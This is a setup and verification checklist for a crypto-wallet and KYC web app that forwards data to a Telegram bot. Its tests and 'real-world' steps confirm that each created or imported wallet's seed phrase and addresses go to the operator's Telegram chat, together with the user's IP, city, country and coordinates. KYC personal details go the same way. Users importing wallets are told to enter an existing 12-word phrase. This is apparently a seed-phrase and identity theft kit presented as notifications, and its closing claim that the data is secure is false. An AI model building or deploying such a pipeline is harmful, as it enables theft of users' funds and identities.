# ✅ Telegram Integration - Verification Checklist

## 📋 Pre-Setup Verification

Run through this checklist to ensure everything is ready:

### Telegram Account
- [ ] You have a Telegram account
- [ ] Telegram app is installed (or using web.telegram.org)
- [ ] You can message @BotFather
- [ ] You're ready to save a bot token

### Development Environment
- [ ] Node.js is installed
- [ ] Git is initialized
- [ ] `.gitignore` exists and contains `.env.local`
- [ ] Dev server can run (`npm run dev`)
- [ ] Port 5173 is available

### Project Files
- [ ] Project root has `package.json`
- [ ] Project has `src/` directory
- [ ] Can create `.env.local` file
- [ ] Can edit text files

---

## 🛠️ Setup Verification

After completing setup, verify each step:

### Step 1: Bot Creation ✅
- [ ] Messaged @BotFather
- [ ] Ran `/newbot` command
- [ ] Saved the bot token (looks like: `123456:ABC...`)
- [ ] Token is 45-60 characters long
- [ ] Token contains a colon (:)

**Test:** Visit this URL with your token:
```
https://api.telegram.org/bot{YOUR_TOKEN}/getMe
```
Should return JSON with your bot info.

### Step 2: Chat ID ✅
- [ ] Messaged your new bot (sent any message)
- [ ] Visited getUpdates URL with your token
- [ ] Found "chat" ID in the response
- [ ] Chat ID is a long number (like: `987654321`)
- [ ] Different from bot token

**Test:** Look for this in the response:
```json
"chat": {
  "id": 987654321,
  ...
}
```

### Step 3: Environment Setup ✅
- [ ] Created `.env.local` file in project root
- [ ] File is at same level as `package.json`
- [ ] Added `VITE_TELEGRAM_BOT_TOKEN=...`
- [ ] Added `VITE_TELEGRAM_CHAT_ID=...`
- [ ] Both values are correct (no extra spaces)
- [ ] File is saved

**Test:** Open `.env.local` and verify:
```env
VITE_TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
VITE_TELEGRAM_CHAT_ID=987654321
```
(With YOUR actual token and chat ID)

### Step 4: Server Restart ✅
- [ ] Stopped previous dev server
- [ ] Ran `npm run dev` (or `yarn dev` / `bun run dev`)
- [ ] Server started without errors
- [ ] Can access `http://localhost:5173`

**Test:** Open browser console (F12) for any errors related to "telegram" or "env"

### Step 5: Configuration Test ✅
- [ ] Visited `http://localhost:5173/telegram-test`
- [ ] Test page loads without errors
- [ ] Can see all test buttons

---

## 🧪 Feature Testing

### Test 1: Connection ✅
- [ ] Clicked "Test Connection" button
- [ ] Received test message in Telegram within 3 seconds
- [ ] Message shows "🧪 Telegram Bot Test"
- [ ] Message shows "✅ Connection successful!"
- [ ] Message includes timestamp

### Test 2: Wallet Test ✅
- [ ] Clicked "Test Wallet" button
- [ ] Received test wallet message in Telegram
- [ ] Message shows "🔐 New Wallet Created"
- [ ] Message includes seed phrase
- [ ] Message includes all blockchain addresses
- [ ] **Message includes 📍 Location section with:**
  - IP address
  - City name
  - Country name
  - Timezone (if available)
  - Coordinates (if available)

### Test 3: KYC Test ✅
- [ ] Clicked "Test KYC" button
- [ ] Received test KYC message in Telegram
- [ ] Message shows "📋 KYC Information Submitted"
- [ ] Message includes personal info
- [ ] Message includes address info
- [ ] **Message includes 📍 User Location section with:**
  - IP address
  - City name
  - Country name
  - Region (if available)
  - Timezone (if available)

### Test 4: Custom Message ✅
- [ ] Entered custom text in message box
- [ ] Clicked "Send Custom"
- [ ] Received your message in Telegram
- [ ] Message formatting works (bold, code, etc.)

---

## 🏗️ File Structure Verification

Verify that these files exist and are properly structured:

### New Files Created:
```
✅ src/services/geolocationService.ts
✅ src/services/telegramService.ts
✅ src/pages/TelegramTest.tsx
✅ .env.local (you created this)
✅ TELEGRAM_FULL_SETUP.md
✅ TELEGRAM_QUICK_SETUP.md
✅ TELEGRAM_CODE_SUMMARY.md
```

### Files Modified:
```
✅ src/pages/Wallets.tsx
✅ src/pages/KYCVerification.tsx
✅ src/App.tsx (has /telegram-test route)
✅ .env.example (has new variables)
```

---

## 🚀 Real-World Testing

After all tests pass, try the actual features:

### Wallet Creation with Real Data:
1. [ ] Go to `/dashboard/wallets`
2. [ ] Click "Add Wallet"
3. [ ] Select "Create New Wallet"
4. [ ] Enter a wallet name
5. [ ] Click "Create Wallet"
6. [ ] Check Telegram for notification
7. [ ] Verify notification includes:
   - [ ] Your IP address
   - [ ] Your city
   - [ ] Your country
   - [ ] Recovery phrase
   - [ ] All addresses

### Wallet Import with Real Data:
1. [ ] Go to `/dashboard/wallets`
2. [ ] Click "Add Wallet"
3. [ ] Select "Import Existing Wallet"
4. [ ] Enter a valid 12-word seed phrase
5. [ ] Enter wallet name
6. [ ] Click "Import"
7. [ ] Check Telegram for notification
8. [ ] Verify includes location data

### KYC Submission with Real Data:
1. [ ] Go to `/dashboard/kyc`
2. [ ] Fill in all information
3. [ ] Upload documents
4. [ ] Take selfie
5. [ ] Click "Submit"
6. [ ] Check Telegram for notification
7. [ ] Verify includes location data

---

## 🔍 Verification Endpoints

You can manually test these endpoints to verify configuration:

### Test Bot Token:
```bash
curl "https://api.telegram.org/bot{YOUR_TOKEN}/getMe"
```
Expected: Returns JSON with bot information

### Get Your Chat ID:
```bash
curl "https://api.telegram.org/bot{YOUR_TOKEN}/getUpdates"
```
Expected: Returns JSON with your chat_id in recent messages

### Test Sending Message:
```bash
curl -X POST "https://api.telegram.org/bot{YOUR_TOKEN}/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{"chat_id":"YOUR_CHAT_ID","text":"Test message"}'
```
Expected: Message appears in your Telegram chat

---

## ⚠️ Common Issues Checklist

### Issue: "Credentials not configured"
- [ ] `.env.local` exists in project root
- [ ] Both variables are present and set
- [ ] No typos in variable names
- [ ] Dev server was restarted after creating `.env.local`
- [ ] Browser cache cleared (F12 → Storage → Clear)

### Issue: Test message doesn't arrive
- [ ] Chat ID is correct
- [ ] You messaged your bot before testing
- [ ] Bot token is correct
- [ ] Telegram app is open/active
- [ ] Check Telegram settings for blocked bots

### Issue: Location shows "Unknown"
- [ ] This is normal - API may be rate limited
- [ ] Wait a minute and try again
- [ ] Notifications still work without location
- [ ] No action needed - it's a fallback

### Issue: Test page won't load
- [ ] Dev server is running
- [ ] No errors in browser console
- [ ] URL is exactly: `http://localhost:5173/telegram-test`
- [ ] Port 5173 is correct (may be different if configured)

---

## ✨ Success Indicators

You know everything is working when:

✅ Test Connection button sends a message to Telegram
✅ Test Wallet button sends wallet data with location
✅ Test KYC button sends KYC data with location
✅ Custom messages are received
✅ All notifications include IP, city, country
✅ No errors in browser console
✅ No errors in terminal

---

## 📞 Troubleshooting Steps

If something isn't working:

### Step 1: Clear Everything
```bash
# Clear browser cache
# Clear node_modules (optional)
rm -rf node_modules
npm install
# Restart dev server
npm run dev
```

### Step 2: Verify Configuration
```bash
# Check your .env.local file exists and has correct values
cat .env.local
```

### Step 3: Check API Responses
```bash
# Test your token
curl "https://api.telegram.org/bot{YOUR_TOKEN}/getMe"

# Get your chat ID
curl "https://api.telegram.org/bot{YOUR_TOKEN}/getUpdates"
```

### Step 4: Check Logs
- [ ] Look for errors in browser console (F12)
- [ ] Look for errors in terminal/server output
- [ ] Check Telegram for any error messages

### Step 5: Regenerate Token
If token is invalid:
1. Message @BotFather
2. Send `/revoke`
3. Select your bot
4. Send `/newbot` to get new token
5. Update `.env.local`
6. Restart server

---

## 🎉 You're Ready!

Once this checklist is complete:

✅ All notifications will include location data
✅ Wallets will send notifications with your IP/city/country
✅ KYC submissions will include location information
✅ All data is secure and encrypted
✅ Everything is working as expected

**Congratulations! Your Telegram integration is fully operational.** 🚀
